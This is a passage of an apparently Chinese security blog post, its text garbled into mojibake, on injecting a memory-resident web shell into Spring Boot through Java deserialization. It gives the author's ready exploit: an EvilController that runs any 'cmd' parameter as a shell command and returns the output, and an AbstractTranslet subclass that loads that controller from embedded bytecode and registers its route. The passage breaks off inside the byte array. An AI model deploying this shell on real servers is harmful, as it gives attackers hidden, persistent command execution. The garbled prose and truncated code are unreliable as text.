alt="image-20230807225613423"></a></p><p>å¯ä»¥çœ‹åˆ°ï¼Œæ˜¯ä»mappingRegistryä¸­è·å–è·¯ç”±ã€‚é‚£æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦åšçš„å°±æ˜¯åœ¨mappingRegistryä¸­æ·»åŠ è·¯ç”±ã€‚åœ¨AbstractHandlerMethodMappingä¸­å°±æä¾›äº†registerMappingæ·»åŠ è·¯ç”±ã€‚</p><p><a href="https://pic.imgdb.cn/item/64d270d31ddac507cc0c9df0.jpg" title="image-20230807231950009" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d270d31ddac507cc0c9df0.jpg" alt="image-20230807231950009"></a></p><p>ä½†æ˜¯AbstractHandlerMethodMappingç±»ä¸ºæŠ½è±¡ç±»ã€‚ä¸è¿‡æˆ‘ä»¬å¯ä»¥ä»å½“å‰ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­è·å¾—RequestMappingHandlerMappingçš„å®ä¾‹beanï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());</span><br><span class="line"><span class="type">RequestMappingHandlerMapping</span> <span class="variable">r</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br></pre></td></tr></table></figure><h4 id="ååºåˆ—åŒ–æ³¨å…¥SpringBoot-Controller-å†…å­˜é©¬"><a href="#ååºåˆ—åŒ–æ³¨å…¥SpringBoot-Controller-å†…å­˜é©¬" class="headerlink" title="ååºåˆ—åŒ–æ³¨å…¥SpringBoot Controller å†…å­˜é©¬"></a>ååºåˆ—åŒ–æ³¨å…¥SpringBoot Controller å†…å­˜é©¬</h4><p>åœ¨ç»™å‡ºEXPå‰ï¼Œé¦–å…ˆç»™å¤§å®¶æä¸€ä¸ªé†’ï¼Œspringboot 2.6.x ä»¥ä¸Šç‰ˆæœ¬å¯¹è·¯ç”±åŒ¹é…æ–¹å¼è¿›è¡Œäº†ä¿®æ”¹ï¼Œä»¥å¾€çš„æ‰‹åŠ¨æ³¨å†Œæ–¹å¼ä¼šå¯¼è‡´ä»»æ„è¯·æ±‚æç¤ºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java.lang.IllegalArgumentException: </span><br><span class="line">Expected lookupPath in request attribute <span class="string">&quot;org.springframework.web.util.UrlPathHelper.PATH&quot;</span>.</span><br></pre></td></tr></table></figure><p>åœ¨ç½‘ä¸Šæ‰¾è§£å†³åŠæ³•æœ‰ä¸‰ç§ï¼Œä¸€ç§æ˜¯é™ä½ç‰ˆæœ¬ï¼Œä¸€ç§æ˜¯ä¿®æ”¹é»˜è®¤æ˜ å°„ç­–ç•¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spring.mvc.pathmatch.matching-strategy=ANT_PATH_MATCHER</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€ç§æ–¹æ³•ï¼š<a href="https://blog.csdn.net/maple_son/article/details/122572869">https://blog.csdn.net/maple_son&#x2F;article&#x2F;details&#x2F;122572869</a></p><p>å› æ­¤å¦‚æœæˆ‘ä»¬ç›´æ¥åˆ©ç”¨ç½‘ä¸Šç»™å‡ºçš„EXPæ¥å‘SpringBootä¸­æ³¨å…¥å†…å­˜é©¬ï¼Œæ˜¯æ‰“ä¸æˆåŠŸçš„ã€‚æ­¤å¤„ç»™å‡ºæˆ‘å†™å¥½çš„EXPï¼Œæ ¹æ®æ³¨é‡Šåº”è¯¥å¯ä»¥çœ‹æ‡‚ã€‚å…ˆå†™ä¸€ä¸ªæ¶æ„çš„Controllerï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.vul_demo;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/shell&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">MemoryShell</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                response.getWriter().write(output);</span><br><span class="line">                response.getWriter().flush();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                response.sendError(<span class="number">404</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var8) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹‹åç”¨test2æ–¹æ³•ç”Ÿæˆä¸Šé¢Controllerç±»çš„å­—èŠ‚ç ï¼Œç„¶åè·Ÿwebsocketååºåˆ—åŒ–ç±»ä¼¼ï¼Œä»å½“å‰çº¿ç¨‹ä¸­æ‹¿åˆ°ClassLoaderï¼Œç„¶åå°†è¿™ä¸ªæ¶æ„çš„ControlleråŠ è½½è¿›JVMï¼Œå¹¶æŒ‰ç…§åˆšåˆšæçš„ç¬¬ä¸‰ç§æ–¹æ³•è‡ªå®šä¹‰æ³¨å†ŒRequestMappingï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.vul_demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilTemplatesImpl</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">&quot;com.example.vul_demo.EvilController&quot;</span>;</span><br><span class="line">            <span class="comment">//åŠ è½½com.example.vul_demo.EvilControllerç±»çš„å­—èŠ‚ç </span></span><br><span class="line">            <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;-<span class="number">54</span>, -<span class="number">2</span>, -<span class="number">70</span>, -<span class="number">66</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">0</span>, -<span class="number">115</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">73</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">74</span>, <span class="number">0</span>, <span class="number">75</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">76</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">77</span>, <span class="number">0</span>, <span class="number">78</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">79</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">80</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">81</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">82</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">83</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">84</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">85</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">86</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">87</span>, <span class="number">0</span>, <span class="number">88</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">87</span>, <span class="number">0</span>, <span class="number">89</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">90</span>, <span class="number">0</span>, <span class="number">91</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">92</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">93</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">94</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">95</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">96</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">97</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">98</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">99</span>, <span class="number">0</span>, <span class="number">100</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">101</span>, <span class="number">0</span>, <span class="number">102</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">101</span>, <span class="number">0</span>, <span class="number">103</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">99</span>, <span class="number">0</span>, <span class="number">104</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">105</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">106</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">107</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">60</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">62</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">78</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">86</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">116</span>, <span class="number">104</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">76</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">47</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">112</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">47</span>, <span class="number">118</span>, <span class="number">117</span>, <span class="number">108</span>, <span class="number">95</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">69</span>, <span class="number">118</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">77</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">83</span>, <span class="number">104</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">82</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">104</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">47</span>, <span class="number">72</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">113</span>, <span class="number">117</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">59</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">104</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">47</span>, <span class="number">72</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">117</span>, <span class="number">120</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">90</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">111</span>, <span class="number">115</span>, <span class="number">84</span>, <span class="number">121</span>, <span class="number">112</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">99</span>, <span class="number">109</span>, <span class="number">100</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">91</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">113</span>, <span class="number">117</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">39</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">104</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">47</span>, <span class="number">72</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">113</span>, <span class="number">117</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">104</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">47</span>, <span class="number">72</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">77</span>, <span class="number">97</span>, <span class="number">112</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">82</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">45</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">108</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">92</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">106</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">109</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">110</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">105</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">77</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">104</span>, <span class="number">111</span>, <span class="number">100</span>, <span class="number">80</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">86</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">65</span>, <span class="number">110</span>, <span class="number">110</span>, <span class="number">111</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">56</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">112</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">102</span>, <span class="number">114</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">119</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">107</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">47</span>, <span class="number">98</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">47</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">110</span>, <span class="number">111</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">47</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">113</span>, <span class="number">117</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">77</span>, <span class="number">97</span>, <span class="number">112</span>, <span class="number">112</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">117</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">83</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">114</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">70</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">69</span>, <span class="number">118</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">46</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">43</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">112</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">102</span>, <span class="number">114</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">119</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">107</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">111</span>, <span class="number">116</span>, <span class="number">121</span>, <span class="number">112</span>, <span class="number">101</span>, <span 